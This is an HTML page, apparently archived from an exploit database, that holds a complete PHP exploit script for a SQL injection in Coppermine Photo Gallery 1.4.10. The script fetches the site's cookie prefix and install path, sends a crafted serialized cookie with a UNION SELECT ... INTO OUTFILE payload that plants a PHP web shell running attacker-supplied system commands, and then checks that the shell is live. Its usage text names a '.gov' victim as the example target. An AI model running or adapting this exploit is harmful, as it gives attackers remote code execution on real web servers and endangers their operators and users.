<html><head><title>Coppermine Photo Gallery 1.4.10 Remote SQL Injection Exploit</title></head><pre>&lt;?php
#####################################
# Coppermine gallery SQL injection exploit
# based on RST/GHC bugs
# Author: bazik, icq 178377
#####################################
error_reporting(0);
class cpg1410_xek {
   public $GLOBALS = array();
 
   function prepareExp($sql) {
      $a1 = '1) UNION SELECT ' . $this-&gt;toHex($sql) . ', ' . $this-&gt;toHex('bazik') . ' LIMIT 1,1/*';
      $b1 = 'bazik';
      $a2 = $sql;
      $b2 = 'bazik';
      $arr = array($a1 =&gt; $b1, $a2 =&gt; $b2);
      return $this-&gt;GLOBALS['prefix'] . '_albpw=' . rawurlencode(serialize($arr));
   }
 
   function toHex($str) {
      for ($i=0; $i &lt; strlen($str); $i++)
         $result .= sprintf(&quot;%X&quot;, ord($str[$i]));
      return &quot;0x&quot; . $result;
   }
 
   function sendQuery($out) {
      $fp = fsockopen($this-&gt;GLOBALS['host'], 80, $errno, $errstr, 30);
      if(!$fp)
         die(&quot;[-] Can't connect to &quot; . $this-&gt;GLOBALS['host'] . &quot; ...\n\n&quot;);
      else {
         fwrite($fp, $out);
         while(!feof($fp))
            $str .= fgets($fp, 128);
         fclose($fp);
         return $str;
      }
   }
 
   function getCookiePrefix() {
      $out  = &quot;HEAD &quot; . $this-&gt;GLOBALS['path'] . &quot;thumbnails.php?album=&quot; . $this-&gt;GLOBALS['albumId'] . &quot; HTTP/1.1\r\n&quot;;
      $out .= &quot;Host: &quot; . $this-&gt;GLOBALS['host'] . &quot;\r\n&quot;;
      $out .= &quot;Connection: Close\r\n\r\n&quot;;
      preg_match_all('!Set-Cookie:.+(.+)_data=.+!Uim', $this-&gt;sendQuery($out), $result);
      return $result[1][0];
   }
 
   function getPathToShell() {
      $out  = &quot;GET &quot; . $this-&gt;GLOBALS['path'] . &quot;/themes/sample/theme.php HTTP/1.1\r\n&quot;;
      $out .= &quot;Host: &quot; . $this-&gt;GLOBALS['host'] . &quot;\r\n&quot;;
      $out .= &quot;Connection: Close\r\n\r\n&quot;;
      preg_match_all('!in\s(.+).{1}themes.{1}sample.{1}theme.php!Uim', $this-&gt;sendQuery($out), $result);
      $str = strip_tags($result[1][0]);
      return str_replace(&quot;\\&quot;, &quot;/&quot;, $str);
   }
 
   function getShell() {
      $sql = $this-&gt;GLOBALS['albumID'] . ') UNION SELECT ' . $this-&gt;toHex('&lt;pre&gt;&lt;?system($_GET[\'a\']);?&gt;&lt;/pre&gt;') . ' INTO OUTFILE \'' . $this-&gt;GLOBALS['pathToShell'] . '/albums/userpics/shell.php\'/*';
      $out  = &quot;GET &quot; . $this-&gt;GLOBALS['path'] . &quot;thumbnails.php?album=&quot; . $this-&gt;GLOBALS['albumID'] . &quot; HTTP/1.1\r\n&quot;;
      $out .= &quot;Host: &quot; . $this-&gt;GLOBALS['host'] . &quot;\r\n&quot;;
      $out .= &quot;Accept-Language: ru\r\n&quot;;
      $out .= &quot;Cookie: &quot; . $this-&gt;prepareExp($sql) . &quot;\r\n&quot;;
      $out .= &quot;Connection: Close\r\n\r\n&quot;;
      $this-&gt;sendQuery($out);
   }
 
   function hat() {
      echo &quot;\n## Coppermine SQL injection exploit\n&quot;;
      echo &quot;## Vulnerable: CPG 1.4.10 stable\n\n&quot;;
      echo &quot;## THIS IS UNPUBLISHED EXPLOIT CODE\n&quot;;
      echo &quot;## KEEP IT PRIVATE\n\n&quot;;
   }
 
   function foot() {
      echo &quot;## (c)oded by bazik\n&quot;;
      echo &quot;## 20/01/2008\n&quot;;
   }
}
 
$exp = new cpg1410_xek();
 
if ($argc != 4) {
   $exp-&gt;hat();
   echo &quot;For example:\n\n&quot;;
   echo &quot;   php cpg1410_xek.php [url] [path] [albumID]\n\n&quot;;
   echo &quot;      [url]     = http://www.victim.gov\n&quot;;
   echo &quot;      [path]    = \cpg1410\\\n&quot;;
   echo &quot;      [albumID] = 1\n\n\n&quot;;
   $exp-&gt;foot();
} else {
   $exp-&gt;hat();
 
   preg_match(&quot;/^(http:\/\/)?([^\/]+)/i&quot;, $argv[1], $matches);
   $exp-&gt;GLOBALS['host']    = $matches[2];
   $exp-&gt;GLOBALS['path']    = $argv[2];
   $exp-&gt;GLOBALS['albumID'] = intval($argv[3]);
   $exp-&gt;GLOBALS['prefix']  = $exp-&gt;getCookiePrefix();
   $exp-&gt;GLOBALS['pathToShell']  = $exp-&gt;getPathToShell();
 
   if(empty($exp-&gt;GLOBALS['prefix']))
      echo &quot;[-] Can't get cookie prefix ...\n\n&quot;;
   else
      echo &quot;[+] Cookie prefix: &quot; . $exp-&gt;GLOBALS['prefix'] . &quot;\n&quot;;
 
   if(empty($exp-&gt;GLOBALS['pathToShell']))
      echo &quot;[-] Can't recognize full path ...\n\n&quot;;
   else {
      echo &quot;[+] Full path: &quot; . $exp-&gt;GLOBALS['pathToShell'] . &quot;\n\n&quot;;
      $exp-&gt;getShell();
      $url = 'http://' . $exp-&gt;GLOBALS['host'] . $exp-&gt;GLOBALS['path'] . 'albums/userpics/shell.php';
      if (file_get_contents($url))
         echo &quot;   Web-shell: &quot; . $url . &quot;\n\n&quot;;
      else
         echo &quot;[-] Can't create web-shell ...\n\n&quot;;
   }
 
   $exp-&gt;foot();
}
?&gt;

# milw0rm.com [2008-01-21]</pre></html>